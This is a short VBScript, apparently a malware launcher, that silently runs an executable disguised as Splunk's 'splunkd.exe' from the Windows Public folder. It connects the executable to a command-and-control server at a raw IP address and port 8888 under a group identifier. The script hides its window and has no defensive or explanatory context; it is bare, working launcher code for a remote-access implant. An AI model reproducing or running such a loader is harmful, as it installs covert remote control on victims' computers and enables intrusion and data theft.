Dim Shll
Set Shll = CreateObject("WScript.Shell")
Call Shll.Run("C:\Users\Public\splunkd.exe -server http://139.180.131.200:8888 -group arg234", 0, True)
Set Shll = Nothing